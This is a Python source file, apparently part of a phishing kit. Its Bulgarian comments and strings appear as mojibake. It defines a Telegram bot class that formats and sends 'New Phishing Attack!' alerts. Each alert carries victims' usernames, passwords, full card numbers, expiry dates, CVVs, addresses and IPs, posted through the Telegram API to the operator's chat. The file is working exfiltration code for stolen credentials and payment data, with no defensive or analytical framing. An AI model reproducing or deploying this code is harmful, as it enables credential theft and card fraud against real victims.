import telegram
import json
import os
import requests
import threading
import time

class TelegramBot:
    _instance = None
    _lock = threading.Lock()

    def __new__(cls, *args, **kwargs):
        if cls._instance is None:
            with cls._lock:
                if cls._instance is None:
                    cls._instance = super(TelegramBot, cls).__new__(cls)
        return cls._instance

    def __init__(self, config_path='data/config.json'):
        if not hasattr(self, 'initialized'):
            self.config_path = config_path
            self.config = self._load_config()
            self.bot_token = None
            self.chat_id = None
            self._initialize_bot()
            self.initialized = True

    def _load_config(self):
        try:
            with open(self.config_path, 'r') as f:
                return json.load(f)
        except (FileNotFoundError, json.JSONDecodeError):
            return {}

    def _initialize_bot(self):
        if 'telegram' in self.config and self.config['telegram']['bot_token']:
            self.bot_token = self.config['telegram']['bot_token']
            self.chat_id = self.config['telegram']['chat_id']

    def send_message(self, message):
        """–ò–∑–ø—Ä–∞—â–∞ —Å—ä–æ–±—â–µ–Ω–∏–µ –∫—ä–º Telegram —á—Ä–µ–∑ –¥–∏—Ä–µ–∫—Ç–Ω–∞ HTTP –∑–∞—è–≤–∫–∞"""
        if not self.bot_token or not self.chat_id:
            return False
            
        try:
            url = f"https://api.telegram.org/bot{self.bot_token}/sendMessage"
            data = {
                "chat_id": self.chat_id,
                "text": message,
                "parse_mode": "HTML"
            }
            
            # –ò–∑–ø–æ–ª–∑–≤–∞–º–µ –æ—Ç–¥–µ–ª–Ω–∞ –Ω–∏—à–∫–∞ –∑–∞ –∏–∑–ø—Ä–∞—â–∞–Ω–µ –Ω–∞ —Å—ä–æ–±—â–µ–Ω–∏–µ—Ç–æ
            threading.Thread(target=self._send_request, args=(url, data)).start()
            return True
        except Exception as e:
            print(f"–ì—Ä–µ—à–∫–∞ –ø—Ä–∏ –∏–∑–ø—Ä–∞—â–∞–Ω–µ –Ω–∞ Telegram —Å—ä–æ–±—â–µ–Ω–∏–µ: {e}")
            return False
            
    def _send_request(self, url, data):
        """–ò–∑–ø—Ä–∞—â–∞ HTTP –∑–∞—è–≤–∫–∞ –≤ –æ—Ç–¥–µ–ª–Ω–∞ –Ω–∏—à–∫–∞"""
        try:
            response = requests.post(url, json=data, timeout=5)
            if response.status_code != 200:
                print(f"–ì—Ä–µ—à–∫–∞ –ø—Ä–∏ –∏–∑–ø—Ä–∞—â–∞–Ω–µ –Ω–∞ Telegram —Å—ä–æ–±—â–µ–Ω–∏–µ: {response.text}")
        except Exception as e:
            print(f"–ì—Ä–µ—à–∫–∞ –ø—Ä–∏ –∏–∑–ø—Ä–∞—â–∞–Ω–µ –Ω–∞ HTTP –∑–∞—è–≤–∫–∞: {e}")

    def format_capture_message(self, data):
        """–§–æ—Ä–º–∞—Ç–∏—Ä–∞ —Å—ä–æ–±—â–µ–Ω–∏–µ—Ç–æ –∑–∞ —É–ª–æ–≤–µ–Ω–∏—Ç–µ –¥–∞–Ω–Ω–∏"""
        message = f"üé£ <b>–ù–æ–≤–∞ –§–∏—à–∏–Ω–≥ –ê—Ç–∞–∫–∞!</b>\n\n"
        message += f"üìÖ –í—Ä–µ–º–µ: {data.get('timestamp', '–ù—è–º–∞ –¥–∞–Ω–Ω–∏')}\n"
        message += f"üåê IP: {data.get('ip_address', '–ù—è–º–∞ –¥–∞–Ω–Ω–∏')}\n"
        message += f"üîç –¢–∏–ø: {data.get('page_type', '–ù–µ–ø–æ–∑–Ω–∞—Ç')}\n\n"
        
        # –î–æ–±–∞–≤—è–Ω–µ –Ω–∞ –ø–æ—Ç—Ä–µ–±–∏—Ç–µ–ª—Å–∫–∏ –¥–∞–Ω–Ω–∏
        if 'username' in data:
            message += f"üë§ –ü–æ—Ç—Ä–µ–±–∏—Ç–µ–ª: <code>{data['username']}</code>\n"
        if 'password' in data:
            message += f"üîë –ü–∞—Ä–æ–ª–∞: <code>{data['password']}</code>\n"
            
        # –î–æ–±–∞–≤—è–Ω–µ –Ω–∞ –¥–∞–Ω–Ω–∏ –∑–∞ –∫–∞—Ä—Ç–∏
        if 'card_holder' in data:
            message += f"üí≥ –ò–º–µ –Ω–∞ –∫–∞—Ä—Ç–∞—Ç–∞: <code>{data['card_holder']}</code>\n"
        if 'card_number' in data:
            message += f"üí≥ –ù–æ–º–µ—Ä –Ω–∞ –∫–∞—Ä—Ç–∞—Ç–∞: <code>{data['card_number']}</code>\n"
        if 'expiry_month' in data and 'expiry_year' in data:
            message += f"üìÖ –í–∞–ª–∏–¥–Ω–æ—Å—Ç: <code>{data['expiry_month']}/{data['expiry_year']}</code>\n"
        if 'cvv' in data:
            message += f"üîí CVV: <code>{data['cvv']}</code>\n"
            
        # –î–æ–±–∞–≤—è–Ω–µ –Ω–∞ –¥–æ–ø—ä–ª–Ω–∏—Ç–µ–ª–Ω–∞ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è
        if 'address' in data:
            message += f"üìç –ê–¥—Ä–µ—Å: {data['address']}\n"
        if 'zip_code' in data:
            message += f"üìÆ –ü–æ—â–µ–Ω—Å–∫–∏ –∫–æ–¥: {data['zip_code']}\n"
            
        message += f"\nüåê User Agent: {data.get('user_agent', '–ù—è–º–∞ –¥–∞–Ω–Ω–∏')}"
        
        return message 